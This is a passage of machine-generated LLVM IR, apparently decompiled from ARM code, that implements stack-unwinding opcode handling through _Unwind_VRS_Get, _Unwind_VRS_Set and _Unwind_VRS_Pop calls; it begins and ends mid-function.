  %v4_186c4 = call i32 @_Unwind_VRS_Pop(i32 %v0_186bc, i32 %v3_186b8, i32 0, i32 0)
  store i32 %v4_186c4, i32* %r0.global-to-local, align 4
  %v2_186c8 = icmp eq i32 %v4_186c4, 0
  store i1 %v2_186c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186c8, label %dec_label_pc_186d0, label %dec_label_pc_188ac

dec_label_pc_186d0:                               ; preds = %dec_label_pc_186a8
  %v0_186d0 = load i32, i32* @r5, align 4
  %v1_186d0 = add i32 %v0_186d0, 8
  %v2_186d0 = inttoptr i32 %v1_186d0 to i8*
  %v3_186d0 = load i8, i8* %v2_186d0, align 1
  %v4_186d0 = zext i8 %v3_186d0 to i32
  store i32 %v4_186d0, i32* %r3.global-to-local, align 4
  %v0_186d4 = load i32, i32* @r4, align 4
  %v1_186d4 = and i32 %v0_186d4, 32768
  %v2_186d4 = icmp eq i32 %v1_186d4, 0
  store i1 %v2_186d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186d4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_186d0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_186d0, %bb147
  %v2_186dc = icmp eq i8 %v3_186d0, 0
  store i1 %v2_186dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186dc, label %dec_label_pc_186ec, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_186e0 = add nsw i32 %v4_186d0, -1
  store i32 %v2_186e0, i32* %r3.global-to-local, align 4
  %v2_186e4 = trunc i32 %v2_186e0 to i8
  store i8 %v2_186e4, i8* %v2_186d0, align 1
  %v0_186e8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_186e8.pr.pr, label %.thread6.dec_label_pc_186ec_crit_edge, label %dec_label_pc_18618

.thread6.dec_label_pc_186ec_crit_edge:            ; preds = %.thread6
  %v0_186ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_186ec

dec_label_pc_186ec:                               ; preds = %bb148, %.thread6.dec_label_pc_186ec_crit_edge
  %v0_186ec = phi i32 [ %v0_186ec.pre, %.thread6.dec_label_pc_186ec_crit_edge ], [ %v0_186d0, %bb148 ]
  %v1_186ec = add i32 %v0_186ec, 9
  %v2_186ec = inttoptr i32 %v1_186ec to i8*
  %v3_186ec = load i8, i8* %v2_186ec, align 1
  %v4_186ec = zext i8 %v3_186ec to i32
  store i32 %v4_186ec, i32* %r3.global-to-local, align 4
  %v2_186f0 = icmp eq i8 %v3_186ec, 0
  store i1 %v2_186f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186f0, label %dec_label_pc_186f8, label %dec_label_pc_185fc

dec_label_pc_186f8:                               ; preds = %dec_label_pc_186ec, %dec_label_pc_185f0, %dec_label_pc_18618
  %v0_186f8 = load i32, i32* @sl, align 4
  %v2_186f8 = icmp eq i32 %v0_186f8, 0
  store i1 %v2_186f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_186f8, label %dec_label_pc_187c0, label %bb149

bb149:                                            ; preds = %dec_label_pc_186f8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18704

dec_label_pc_18704:                               ; preds = %bb149, %dec_label_pc_18c74, %dec_label_pc_18b14, %dec_label_pc_18938, %dec_label_pc_188f0, %dec_label_pc_188ac, %dec_label_pc_187c0
  %v1_1870c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_18c74 ], [ 9, %dec_label_pc_18b14 ], [ 9, %dec_label_pc_18938 ], [ 9, %dec_label_pc_188f0 ], [ 9, %dec_label_pc_188ac ], [ %v0_187f4, %dec_label_pc_187c0 ]
  store i32 %v9_185c8, i32* %r6.global-to-local, align 4
  store i32 %v21_185c8, i32* @lr, align 4
  ret i32 %v1_1870c

dec_label_pc_18710:                               ; preds = %dec_label_pc_18634
  %v1_18710 = mul i32 %v0_18634, 4
  %v3_18714 = and i32 %v1_18710, 252
  store i32 %v3_18714, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18720 = load i32, i32* @r7, align 4
  store i32 %v0_18720, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_18728 = add nuw nsw i32 %v3_18714, 4
  store i32 %v1_18728, i32* %r6.global-to-local, align 4
  %v5_18730 = call i32 @_Unwind_VRS_Get(i32 %v0_18720, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18734 = load i32, i32* @r4, align 4
  %v1_18734 = and i32 %v0_18734, 64
  %v2_18734 = icmp eq i32 %v1_18734, 0
  store i1 %v2_18734, i1* %cpsr_z.global-to-local, align 1
  %v4_1873c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_18748 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_18748
  %storemerge160.p = select i1 %v2_18734, i32 %v2_18748, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1873c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_18764 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18764, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_185dc.backedge

dec_label_pc_185dc.backedge:                      ; preds = %dec_label_pc_18710, %dec_label_pc_1878c, %dec_label_pc_18c10, %dec_label_pc_188dc, %dec_label_pc_18914, %dec_label_pc_18894, %dec_label_pc_18b00
  %v0_185dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_185dc

dec_label_pc_1876c:                               ; preds = %dec_label_pc_1863c
  %v7_1876c = icmp eq i32 %v1_1863c, 144
  store i1 %v7_1876c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1876c, label %dec_label_pc_18774, label %dec_label_pc_188b4

dec_label_pc_18774:                               ; preds = %dec_label_pc_1876c
  %v1_18774 = urem i32 %v0_18634, 16
  store i32 %v1_18774, i32* %r2.global-to-local, align 4
  %v2_18778 = icmp eq i32 %v1_18774, 15
  store i1 %v2_18778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18778, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_18774
  %v8_1877c = icmp eq i32 %v1_18774, 13
  store i1 %v8_1877c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1877c, label %bb154, label %dec_label_pc_1878c

.thread21:                                        ; preds = %dec_label_pc_18774
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_188ac

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_188ac

dec_label_pc_1878c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18798 = load i32, i32* @r7, align 4
  store i32 %v0_18798, i32* %r0.global-to-local, align 4
  %v5_187a0 = call i32 @_Unwind_VRS_Get(i32 %v0_18798, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_187a8 = load i32, i32* @r7, align 4
  store i32 %v0_187a8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_187b8 = call i32 @_Unwind_VRS_Set(i32 %v0_187a8, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_187b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_185dc.backedge

dec_label_pc_187c0:                               ; preds = %dec_label_pc_186f8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_187d0 = load i32, i32* @r7, align 4
  store i32 %v0_187d0, i32* %r0.global-to-local, align 4
  %v7_187d8 = call i32 @_Unwind_VRS_Get(i32 %v0_187d0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_187dc = load i32, i32* @r7, align 4
  store i32 %v0_187dc, i32* %r0.global-to-local, align 4
  %v0_187e0 = load i32, i32* @sl, align 4
  store i32 %v0_187e0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_187e0, i32* %r3.global-to-local, align 4
  %v5_187f0 = call i32 @_Unwind_VRS_Set(i32 %v0_187dc, i32 %v0_187e0, i32 15, i32 %v0_187e0, i8* bitcast (i32* @0 to i8*))
  %v0_187f4 = load i32, i32* @sl, align 4
  store i32 %v0_187f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18704

dec_label_pc_187fc:                               ; preds = %dec_label_pc_189f0
  %v7_187fc = icmp eq i32 %v0_189f0, 199
  store i1 %v7_187fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_187fc, label %dec_label_pc_18ad0, label %dec_label_pc_18804

dec_label_pc_18804:                               ; preds = %dec_label_pc_187fc
  %v1_18804 = and i32 %v0_18634, 248
  store i32 %v1_18804, i32* %r3.global-to-local, align 4
  %v7_18808 = icmp eq i32 %v1_18804, 192
  store i1 %v7_18808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18808, label %.thread24, label %dec_label_pc_18820

.thread24:                                        ; preds = %dec_label_pc_18804
  %v2_1880c = urem i32 %v0_18634, 16
  %v2_18810 = add nuw nsw i32 %v2_1880c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_18818 = or i32 %v2_18810, 655360
  store i32 %v2_18818, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188dc

dec_label_pc_18820:                               ; preds = %dec_label_pc_18804
  %v7_18820 = icmp eq i32 %v0_189f0, 200
  store i1 %v7_18820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18820, label %dec_label_pc_18a64, label %dec_label_pc_18828

dec_label_pc_18828:                               ; preds = %dec_label_pc_18820
  %v7_18828 = icmp eq i32 %v0_189f0, 201
  store i1 %v7_18828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18828, label %dec_label_pc_18830, label %dec_label_pc_188ac

dec_label_pc_18830:                               ; preds = %dec_label_pc_18828
  %v0_18830 = load i32, i32* @r5, align 4
  %v1_18830 = add i32 %v0_18830, 8
  %v2_18830 = inttoptr i32 %v1_18830 to i8*
  %v3_18830 = load i8, i8* %v2_18830, align 1
  %v4_18830 = zext i8 %v3_18830 to i32
  store i32 %v4_18830, i32* %r3.global-to-local, align 4
  %v2_18834 = icmp eq i8 %v3_18830, 0
  store i1 %v2_18834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18834, label %dec_label_pc_18844, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_18830
  %v2_18838 = add nsw i32 %v4_18830, -1
  store i32 %v2_18838, i32* %r3.global-to-local, align 4
  %v2_1883c = trunc i32 %v2_18838 to i8
  store i8 %v2_1883c, i8* %v2_18830, align 1
  %v0_18840.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18840.pr.pr, label %.thread26.dec_label_pc_18844_crit_edge, label %dec_label_pc_18878

.thread26.dec_label_pc_18844_crit_edge:           ; preds = %.thread26
  %v0_18844.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18844

dec_label_pc_18844:                               ; preds = %.thread26.dec_label_pc_18844_crit_edge, %dec_label_pc_18830
  %v2_1885c = phi i32 [ %v0_18844.pre, %.thread26.dec_label_pc_18844_crit_edge ], [ %v0_18830, %dec_label_pc_18830 ]
  %v1_18844 = add i32 %v2_1885c, 9
  %v2_18844 = inttoptr i32 %v1_18844 to i8*
  %v3_18844 = load i8, i8* %v2_18844, align 1
  %v4_18844 = zext i8 %v3_18844 to i32
  store i32 %v4_18844, i32* %r3.global-to-local, align 4
  %v2_18848 = icmp eq i8 %v3_18844, 0
  store i1 %v2_18848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18848, label %dec_label_pc_18894, label %dec_label_pc_18858

dec_label_pc_18858:                               ; preds = %dec_label_pc_18844
  %v1_18858 = add nsw i32 %v4_18844, -1
  store i32 %v1_18858, i32* %r3.global-to-local, align 4
  %v1_1885c = trunc i32 %v1_18858 to i8
  store i8 %v1_1885c, i8* %v2_18844, align 1
  %v0_18860 = load i32, i32* @r5, align 4
  %v1_18860 = add i32 %v0_18860, 4
  %v2_18860 = inttoptr i32 %v1_18860 to i32*
  %v3_18860 = load i32, i32* %v2_18860, align 4
  store i32 %v3_18860, i32* %r2.global-to-local, align 4
  %v1_18864 = inttoptr i32 %v3_18860 to i32*
  %v2_18864 = load i32, i32* %v1_18864, align 4
  store i32 %v2_18864, i32* %r0.global-to-local, align 4
  %v4_18864 = add i32 %v3_18860, 4
  store i32 %v4_18864, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18864, i32* %v2_18860, align 4
  %v0_18870 = load i32, i32* %r3.global-to-local, align 4
  %v1_18870 = trunc i32 %v0_18870 to i8
  %v2_18870 = load i32, i32* @r5, align 4
  %v3_18870 = add i32 %v2_18870, 8
  %v4_18870 = inttoptr i32 %v3_18870 to i8*
  store i8 %v1_18870, i8* %v4_18870, align 1
  %v0_18874 = load i32, i32* %r0.global-to-local, align 4
  %v1_18874 = load i32, i32* @r5, align 4
  %v2_18874 = inttoptr i32 %v1_18874 to i32*
  store i32 %v0_18874, i32* %v2_18874, align 4
  br label %dec_label_pc_18878

dec_label_pc_18878:                               ; preds = %.thread26, %dec_label_pc_18858
  %v0_18878 = load i32, i32* %r0.global-to-local, align 4
  %v3_18878 = udiv i32 %v0_18878, 16777216
  %v1_1887c = urem i32 %v3_18878, 16
  %v3_18880 = mul i32 %v0_18878, 256
  %v1_18884 = add nuw nsw i32 %v1_1887c, 1
  store i32 %v1_18884, i32* %r1.global-to-local, align 4
  %v1_18888 = and i32 %v3_18878, 240
  store i32 %v1_18888, i32* %r3.global-to-local, align 4
  %v1_1888c = load i32, i32* @r5, align 4
  %v2_1888c = inttoptr i32 %v1_1888c to i32*
  store i32 %v3_18880, i32* %v2_1888c, align 4
  %v0_18890 = load i32, i32* %r1.global-to-local, align 4
  %v1_18890 = load i32, i32* %r3.global-to-local, align 4
  %v4_18890 = mul i32 %v1_18890, 4096
  %v5_18890 = or i32 %v4_18890, %v0_18890
  br label %dec_label_pc_18894

dec_label_pc_18894:                               ; preds = %dec_label_pc_18844, %dec_label_pc_18878
  %storemerge = phi i32 [ %v5_18890, %dec_label_pc_18878 ], [ 720897, %dec_label_pc_18844 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_18894 = load i32, i32* @r7, align 4
  store i32 %v0_18894, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_188a0 = call i32 @_Unwind_VRS_Pop(i32 %v0_18894, i32 1, i32 5, i32 5)
  store i32 %v4_188a0, i32* %r0.global-to-local, align 4
  %v2_188a4 = icmp eq i32 %v4_188a0, 0
  store i1 %v2_188a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188a4, label %dec_label_pc_185dc.backedge, label %dec_label_pc_188ac

dec_label_pc_188ac:                               ; preds = %dec_label_pc_18af8, %dec_label_pc_18828, %dec_label_pc_18908, %dec_label_pc_18cac, %dec_label_pc_18c7c, %dec_label_pc_18c58, %dec_label_pc_18ae4, %dec_label_pc_18894, %dec_label_pc_186a8, %dec_label_pc_1869c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18704

dec_label_pc_188b4:                               ; preds = %dec_label_pc_1876c
  %v7_188b4 = icmp eq i32 %v1_1863c, 160
  store i1 %v7_188b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_188b4, label %dec_label_pc_188bc, label %dec_label_pc_188f8

dec_label_pc_188bc:                               ; preds = %dec_label_pc_188b4
  %v0_188bc = load i32, i32* %ip.global-to-local, align 4
  %v1_188bc = urem i32 %v0_188bc, 8
  %v1_188c0 = xor i32 %v1_188bc, 7
  store i32 %v1_188c0, i32* %r3.global-to-local, align 4
  %v6_188c8 = lshr i32 4080, %v1_188c0
  %v1_188cc = and i32 %v0_18634, 8
  %v2_188cc = icmp eq i32 %v1_188cc, 0
  store i1 %v2_188cc, i1* %cpsr_z.global-to-local, align 1
  %v1_188d0 = and i32 %v6_188c8, 4080
  %tmp155 = mul nuw nsw i32 %v1_188cc, 2048
  %tmp156 = or i32 %v1_188d0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_188dc

dec_label_pc_188dc:                               ; preds = %.thread44, %.thread24, %dec_label_pc_18c6c.dec_label_pc_188dc_crit_edge, %bb157, %dec_label_pc_18ac8, %dec_label_pc_18a5c, %dec_label_pc_189bc, %dec_label_pc_188bc
  %v2_188e4 = phi i32 [ %v2_189e0, %.thread44 ], [ %v2_189e8, %bb157 ], [ %v2_188e4.pre, %dec_label_pc_18c6c.dec_label_pc_188dc_crit_edge ], [ %v2_18818, %.thread24 ], [ %storemerge130, %dec_label_pc_18ac8 ], [ %storemerge131, %dec_label_pc_18a5c ], [ %storemerge132, %dec_label_pc_189bc ], [ %tmp156, %dec_label_pc_188bc ]
  %v0_188e0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_18c6c.dec_label_pc_188dc_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_18ac8 ], [ 3, %dec_label_pc_18a5c ], [ 1, %dec_label_pc_189bc ], [ 0, %dec_label_pc_188bc ]
  %v0_188dc = load i32, i32* @r7, align 4
  store i32 %v0_188dc, i32* %r0.global-to-local, align 4
  store i32 %v0_188e0, i32* %r3.global-to-local, align 4
  %v4_188e4 = call i32 @_Unwind_VRS_Pop(i32 %v0_188dc, i32 %v0_188e0, i32 %v2_188e4, i32 %v0_188e0)
  store i32 %v4_188e4, i32* %r0.global-to-local, align 4
  %v2_188e8 = icmp eq i32 %v4_188e4, 0
  store i1 %v2_188e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188e8, label %dec_label_pc_185dc.backedge, label %dec_label_pc_188f0

dec_label_pc_188f0:                               ; preds = %dec_label_pc_188dc
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18704

dec_label_pc_188f8:                               ; preds = %dec_label_pc_188b4
  %v7_188f8 = icmp eq i32 %v1_1863c, 176
  store i1 %v7_188f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_188f8, label %dec_label_pc_18940, label %dec_label_pc_18900

dec_label_pc_18900:                               ; preds = %dec_label_pc_188f8
  %v7_18900 = icmp eq i32 %v1_1863c, 192
  store i1 %v7_18900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18900, label %dec_label_pc_189f0, label %dec_label_pc_18908

dec_label_pc_18908:                               ; preds = %dec_label_pc_18900
  %v1_18908 = and i32 %v0_18634, 248
  store i32 %v1_18908, i32* %r3.global-to-local, align 4
  %v7_1890c = icmp eq i32 %v1_18908, 208
  store i1 %v7_1890c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1890c, label %dec_label_pc_18914, label %dec_label_pc_188ac

dec_label_pc_18914:                               ; preds = %dec_label_pc_18908
  %v1_18914 = urem i32 %v0_18634, 8
  %v1_18918 = add nuw nsw i32 %v1_18914, 1
  %v1_1891c = or i32 %v1_18918, 524288
  store i32 %v1_1891c, i32* %r2.global-to-local, align 4
  %v0_18920 = load i32, i32* @r7, align 4
  store i32 %v0_18920, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1892c = call i32 @_Unwind_VRS_Pop(i32 %v0_18920, i32 1, i32 %v1_1891c, i32 5)
  store i32 %v4_1892c, i32* %r0.global-to-local, align 4
  %v2_18930 = icmp eq i32 %v4_1892c, 0
  store i1 %v2_18930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18930, label %dec_label_pc_185dc.backedge, label %dec_label_pc_18938

dec_label_pc_18938:                               ; preds = %dec_label_pc_18914
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18704

dec_label_pc_18940:                               ; preds = %dec_label_pc_188f8
  %v0_18940 = load i32, i32* %ip.global-to-local, align 4
  %v7_18940 = icmp eq i32 %v0_18940, 177
  store i1 %v7_18940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18940, label %dec_label_pc_18c44, label %dec_label_pc_18948

dec_label_pc_18948:                               ; preds = %dec_label_pc_18940
  %v7_18948 = icmp eq i32 %v0_18940, 178
  store i1 %v7_18948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18948, label %dec_label_pc_18b1c, label %dec_label_pc_18950

dec_label_pc_18950:                               ; preds = %dec_label_pc_18948
  %v7_18950 = icmp eq i32 %v0_18940, 179
  store i1 %v7_18950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18950, label %dec_label_pc_18958, label %dec_label_pc_189c4

dec_label_pc_18958:                               ; preds = %dec_label_pc_18950
  %v0_18958 = load i32, i32* @r5, align 4
  %v1_18958 = add i32 %v0_18958, 8
  %v2_18958 = inttoptr i32 %v1_18958 to i8*
  %v3_18958 = load i8, i8* %v2_18958, align 1
  %v4_18958 = zext i8 %v3_18958 to i32
  store i32 %v4_18958, i32* %r3.global-to-local, align 4
  %v2_1895c = icmp eq i8 %v3_18958, 0
  store i1 %v2_1895c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1895c, label %dec_label_pc_1896c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_18958
  %v2_18960 = add nsw i32 %v4_18958, -1
  store i32 %v2_18960, i32* %r3.global-to-local, align 4
  %v2_18964 = trunc i32 %v2_18960 to i8
  store i8 %v2_18964, i8* %v2_18958, align 1
  %v0_18968.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18968.pr.pr, label %.thread30.dec_label_pc_1896c_crit_edge, label %dec_label_pc_189a0

.thread30.dec_label_pc_1896c_crit_edge:           ; preds = %.thread30
  %v0_1896c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1896c

dec_label_pc_1896c:                               ; preds = %.thread30.dec_label_pc_1896c_crit_edge, %dec_label_pc_18958
  %v2_18984 = phi i32 [ %v0_1896c.pre, %.thread30.dec_label_pc_1896c_crit_edge ], [ %v0_18958, %dec_label_pc_18958 ]
  %v1_1896c = add i32 %v2_18984, 9
  %v2_1896c = inttoptr i32 %v1_1896c to i8*
  %v3_1896c = load i8, i8* %v2_1896c, align 1
  %v4_1896c = zext i8 %v3_1896c to i32
  store i32 %v4_1896c, i32* %r3.global-to-local, align 4
  %v2_18970 = icmp eq i8 %v3_1896c, 0
  store i1 %v2_18970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18970, label %dec_label_pc_189bc, label %dec_label_pc_18980

dec_label_pc_18980:                               ; preds = %dec_label_pc_1896c
  %v1_18980 = add nsw i32 %v4_1896c, -1
  store i32 %v1_18980, i32* %r3.global-to-local, align 4
  %v1_18984 = trunc i32 %v1_18980 to i8
  store i8 %v1_18984, i8* %v2_1896c, align 1
  %v0_18988 = load i32, i32* @r5, align 4
  %v1_18988 = add i32 %v0_18988, 4
  %v2_18988 = inttoptr i32 %v1_18988 to i32*
  %v3_18988 = load i32, i32* %v2_18988, align 4
  store i32 %v3_18988, i32* %r2.global-to-local, align 4
  %v1_1898c = inttoptr i32 %v3_18988 to i32*
  %v2_1898c = load i32, i32* %v1_1898c, align 4
  store i32 %v2_1898c, i32* %r0.global-to-local, align 4
  %v4_1898c = add i32 %v3_18988, 4
  store i32 %v4_1898c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1898c, i32* %v2_18988, align 4
  %v0_18998 = load i32, i32* %r3.global-to-local, align 4
  %v1_18998 = trunc i32 %v0_18998 to i8
  %v2_18998 = load i32, i32* @r5, align 4
  %v3_18998 = add i32 %v2_18998, 8
  %v4_18998 = inttoptr i32 %v3_18998 to i8*
  store i8 %v1_18998, i8* %v4_18998, align 1
  %v0_1899c = load i32, i32* %r0.global-to-local, align 4
  %v1_1899c = load i32, i32* @r5, align 4
  %v2_1899c = inttoptr i32 %v1_1899c to i32*
  store i32 %v0_1899c, i32* %v2_1899c, align 4
  br label %dec_label_pc_189a0

dec_label_pc_189a0:                               ; preds = %.thread30, %dec_label_pc_18980
  %v0_189a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_189a0 = udiv i32 %v0_189a0, 16777216
  %v1_189a4 = urem i32 %v3_189a0, 16
  %v3_189a8 = mul i32 %v0_189a0, 256
  store i32 %v3_189a8, i32* %r0.global-to-local, align 4
  %v1_189ac = add nuw nsw i32 %v1_189a4, 1
  store i32 %v1_189ac, i32* %r2.global-to-local, align 4
  %v1_189b0 = and i32 %v3_189a0, 240
  store i32 %v1_189b0, i32* %r3.global-to-local, align 4
  %v1_189b4 = load i32, i32* @r5, align 4
  %v2_189b4 = inttoptr i32 %v1_189b4 to i32*
  store i32 %v3_189a8, i32* %v2_189b4, align 4
  %v0_189b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_189b8 = load i32, i32* %r3.global-to-local, align 4
  %v4_189b8 = mul i32 %v1_189b8, 4096
  %v5_189b8 = or i32 %v4_189b8, %v0_189b8
  br label %dec_label_pc_189bc

dec_label_pc_189bc:                               ; preds = %dec_label_pc_1896c, %dec_label_pc_189a0
  %storemerge132 = phi i32 [ %v5_189b8, %dec_label_pc_189a0 ], [ 720897, %dec_label_pc_1896c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_188dc

dec_label_pc_189c4:                               ; preds = %dec_label_pc_18950
  %v1_189c4 = and i32 %v0_18634, 252
  store i32 %v1_189c4, i32* %r3.global-to-local, align 4
  %v7_189c8 = icmp eq i32 %v1_189c4, 180
  store i1 %v7_189c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_189c8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_189c4
  %v2_189cc = urem i32 %v0_18634, 4
  %v2_189d4 = add nuw nsw i32 %v2_189cc, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_189e0 = or i32 %v2_189d4, 262144
  store i32 %v2_189e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188dc

bb157:                                            ; preds = %dec_label_pc_189c4
  %v2_189d0 = urem i32 %v0_18940, 8
  %v2_189d8 = add nuw nsw i32 %v2_189d0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_189e8 = or i32 %v2_189d8, 524288
  store i32 %v2_189e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188dc

dec_label_pc_189f0:                               ; preds = %dec_label_pc_18900
  %v0_189f0 = load i32, i32* %ip.global-to-local, align 4
  %v7_189f0 = icmp eq i32 %v0_189f0, 198
  store i1 %v7_189f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_189f0, label %dec_label_pc_189f8, label %dec_label_pc_187fc

dec_label_pc_189f8:                               ; preds = %dec_label_pc_189f0
  %v0_189f8 = load i32, i32* @r5, align 4
  %v1_189f8 = add i32 %v0_189f8, 8
  %v2_189f8 = inttoptr i32 %v1_189f8 to i8*
  %v3_189f8 = load i8, i8* %v2_189f8, align 1
  %v4_189f8 = zext i8 %v3_189f8 to i32
  store i32 %v4_189f8, i32* %r3.global-to-local, align 4
  %v2_189fc = icmp eq i8 %v3_189f8, 0
  store i1 %v2_189fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189fc, label %dec_label_pc_18a0c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_189f8
  %v2_18a00 = add nsw i32 %v4_189f8, -1
  store i32 %v2_18a00, i32* %r3.global-to-local, align 4
  %v2_18a04 = trunc i32 %v2_18a00 to i8
  store i8 %v2_18a04, i8* %v2_189f8, align 1
  %v0_18a08.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18a08.pr.pr, label %.thread48.dec_label_pc_18a0c_crit_edge, label %dec_label_pc_18a40

.thread48.dec_label_pc_18a0c_crit_edge:           ; preds = %.thread48
  %v0_18a0c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18a0c

dec_label_pc_18a0c:                               ; preds = %.thread48.dec_label_pc_18a0c_crit_edge, %dec_label_pc_189f8
  %v2_18a24 = phi i32 [ %v0_18a0c.pre, %.thread48.dec_label_pc_18a0c_crit_edge ], [ %v0_189f8, %dec_label_pc_189f8 ]
  %v1_18a0c = add i32 %v2_18a24, 9
  %v2_18a0c = inttoptr i32 %v1_18a0c to i8*
  %v3_18a0c = load i8, i8* %v2_18a0c, align 1
  %v4_18a0c = zext i8 %v3_18a0c to i32
  store i32 %v4_18a0c, i32* %r3.global-to-local, align 4
  %v2_18a10 = icmp eq i8 %v3_18a0c, 0
  store i1 %v2_18a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a10, label %dec_label_pc_18a5c, label %dec_label_pc_18a20

dec_label_pc_18a20:                               ; preds = %dec_label_pc_18a0c
  %v1_18a20 = add nsw i32 %v4_18a0c, -1
